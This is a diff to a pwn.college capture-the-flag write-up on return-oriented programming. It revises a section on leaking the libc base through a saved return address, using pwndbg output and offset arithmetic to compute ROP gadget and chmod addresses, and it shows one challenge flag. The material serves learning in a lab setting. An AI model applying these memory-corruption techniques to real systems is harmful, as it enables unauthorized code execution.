@@ -12145,7 +12145,7 @@ pwndbg> x/gx 0x7ffe0e9228f8
 
 ```
 pwndbg> p/x 0x737019aac083 - 0x24083
-$3 = 0x737019a88000   ← libc base (page-aligned )
+$3 = 0x737019a88000   ← libc base (page-aligned)
 ```
 
 - Saved RIP address: `buf + 88 = 0x7ffe0e9228f8`
@@ -12739,34 +12739,49 @@ hacker@return-oriented-programming~guarded-gadgets-easy:~$ readelf -s /lib/x86_6
 
 ### Leaking Libc base
 
-The binary doesn't print any libc addresses. However, the saved RIP sitting at `buf + 88` on the stack points into `__libc_start_main+243`, because that is who called `main()`. We use the arbitrary read primitive to fetch that 8-byte value directly.
+The binary doesn't print any libc addresses. However, the saved RIP sitting at `buf + 136` on the stack points into `__libc_start_main+243`, because that is who called `main()`. We use the arbitrary read primitive to fetch that 8-byte value directly.
 
-From the backtrace:
-
-```
-1   0x737019aac083 __libc_start_main+243
-```
+The saved RIP address comes from `info frame`:
 
 ```
-pwndbg> x/gx 0x7ffe0e9228f8
-0x7ffe0e9228f8: 0x0000737019aac083
+pwndbg> info frame
+Saved registers:
+rbp at 0x7ffcf1340cf0, rip at 0x7ffcf1340cf8
 ```
 
+`buf + 136 = 0x7ffcf1340c70 + 136 = 0x7ffcf1340cf8`
+
+The saved RIP value comes from the backtrace:
+
 ```
-pwndbg> p/x 0x737019aac083 - 0x24083
-$3 = 0x737019a88000
+1 0x757e58b54083 __libc_start_main+243
 ```
 
-- Saved RIP: `0x737019aac083`
-- `__libc_start_main+243` is at libc offset `0x24083`
-- libc base: `0x737019aac083 - 0x24083 = 0x737019a88000`
+Confirmed by reading it directly:
+
+```
+pwndbg> x/gx 0x7ffcf1340cf8
+0x7ffcf1340cf8: 0x0000757e58b54083
+```
+
+`__libc_start_main+243` is at libc offset `0x24083`, this is fixed for this libc version, derived from:
+
+```
+pwndbg> p/x 0x757e58b54083 - 0x24083
+$3 = 0x757e58b30000   ← libc base (page-aligned)
+```
+
+- Saved RIP address: `buf + 136 = 0x7ffcf1340cf8`
+- Saved RIP value: `0x757e58b54083`
+- `__libc_start_main+243` libc offset: `0x24083`
+- libc base: `0x757e58b54083 - 0x24083 = 0x757e58b30000`
 
 From there all function and gadget addresses follow:
 
 ```
-pop_rdi = 0x737019a88000 + 0x23b6a = 0x737019aab56a
-pop_rsi = 0x737019a88000 + 0x2601f = 0x737019aae01f
-chmod   = 0x737019a88000 + 0x10dd80 = 0x737019b95d80
+pop_rdi = 0x757e58b30000 + 0x23b6a = 0x757e58b53b6a
+pop_rsi = 0x757e58b30000 + 0x2601f = 0x757e58b5601f
+chmod   = 0x757e58b30000 + 0x10dd80 = 0x757e58c3dd80
 ```
 
 ### ROP chain
@@ -12875,6 +12890,7 @@ pwn.college{cuAFnOlGqi0aaNd1OJwtlLU09th.0lN2MDL4ITM0EzW}
 ```
 
 &nbsp;
+
 ## ROP Roulette (Easy)
 
 ```
@@ -13120,7 +13136,7 @@ From the backtrace:
 
 ```
 pwndbg> p/x 0x7bb94ef0d083 - 0x24083
-$4 = 0x7bb94eee9000   ← libc base (page-aligned )
+$4 = 0x7bb94eee9000   ← libc base (page-aligned)
 ```
 
 - `__libc_start_main+243` libc offset: `0x24083`
